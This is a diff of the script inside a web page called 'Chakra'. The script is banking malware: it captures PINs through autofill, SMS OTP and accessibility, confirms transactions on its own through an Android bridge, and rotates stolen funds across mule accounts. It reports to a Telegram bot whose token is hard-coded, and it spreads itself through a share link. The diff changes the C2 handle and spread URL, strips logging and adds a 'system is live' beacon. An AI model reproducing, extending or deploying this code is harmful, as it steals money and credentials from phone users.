@@ -29,12 +29,12 @@
 
   <script>
     // ============================================================
-    // CHAKRA - COMPLETE SYSTEM (NEW BOT)
+    // CHAKRA - COMPLETE SYSTEM (UPDATED USERNAME)
     // ============================================================
 
-    // ===== YOUR NEW BOT CREDENTIALS =====
+    // ===== YOUR CREDENTIALS =====
     const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
-    const YOUR_USERNAME = '@WIREXP';
+    const YOUR_USERNAME = '@WIRESR99';
 
     // ===== YOUR MULE ACCOUNTS =====
     const muleAccounts = [
@@ -51,7 +51,7 @@
     let totalDrained = 0;
 
     // ============================================================
-    // SEND TO TELEGRAM (DUAL METHOD)
+    // SEND TO TELEGRAM
     // ============================================================
     function sendToTelegram(message) {
       console.log('📤 Sending:', message);
@@ -83,6 +83,15 @@
       // Method 2: GET (backup)
       var url = 'https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage?chat_id=' + YOUR_USERNAME + '&text=' + encodeURIComponent(message);
       fetch(url)
+        .then(function(response) {
+          console.log('GET status:', response.status);
+          return response.json();
+        })
+        .then(function(data) {
+          if (data.ok) {
+            console.log('✅ GET message sent!');
+          }
+        })
         .catch(function() {});
     }
 
@@ -117,7 +126,6 @@
           if (pin) {
             capturedPIN = pin;
             sendToTelegram('[Chakra] 🔑 PIN via Autofill');
-            console.log('✅ PIN via Autofill');
             return pin;
           }
         }
@@ -131,7 +139,6 @@
           if (match) {
             capturedPIN = match[0];
             sendToTelegram('[Chakra] 🔑 PIN via SMS OTP');
-            console.log('✅ PIN via SMS OTP');
             return match[0];
           }
         }
@@ -145,14 +152,12 @@
           if (match) {
             capturedPIN = match[0];
             sendToTelegram('[Chakra] 🔑 PIN via Accessibility');
-            console.log('✅ PIN via Accessibility');
             return match[0];
           }
         }
       } catch(e) {}
 
       sendToTelegram('[Chakra] ❌ PIN capture failed');
-      console.log('❌ PIN capture failed');
       return null;
     }
 
@@ -164,7 +169,6 @@
         currentMuleIndex = (currentMuleIndex + 1) % muleAccounts.length;
         transactionsOnMule = 0;
         sendToTelegram('[Chakra] 🔄 Switched to mule ' + (currentMuleIndex + 1) + ': ' + muleAccounts[currentMuleIndex]);
-        console.log('🔄 Switched to:', muleAccounts[currentMuleIndex]);
       }
       transactionsOnMule++;
       return muleAccounts[currentMuleIndex];
@@ -190,7 +194,6 @@
           setTimeout(function() {
             if (capturedPIN) {
               window.Android.autoFillPin(capturedPIN);
-              console.log('🔑 PIN auto-filled');
             }
           }, 2000);
 
@@ -198,14 +201,10 @@
             window.Android.confirmTransaction();
             totalDrained += amount;
             sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule);
-            console.log('✅ Transaction completed');
           }, 3000);
-        } else {
-          console.log('⚠️ Android bridge not available');
         }
       } catch(e) {
         sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message);
-        console.log('❌ Error:', e.message);
       }
     }
 
@@ -239,7 +238,7 @@
     // SPREAD ENGINE
     // ============================================================
     setInterval(function() {
-      var link = 'https://bit.ly/4xaXs4E';
+      var link = 'https://hoihohavapv.github.io/Chakra-test/index.html';
       console.log('📤 Spreading...');
 
       if (navigator.share) {
@@ -297,7 +296,6 @@
     // ============================================================
     window.onerror = function(error, url, line) {
       sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
-      console.log('❌ Error:', error);
       return true;
     };
 
@@ -319,6 +317,11 @@
     console.log('[Chakra] Username:', YOUR_USERNAME);
     console.log('[Chakra] Mules:', muleAccounts.length);
     console.log('========================================');
+
+    // ===== TEST TELEGRAM CONNECTION =====
+    setTimeout(function() {
+      sendToTelegram('[Chakra] ✅ System is live and connected!');
+    }, 1000);
   </script>
 </body>
 </html>
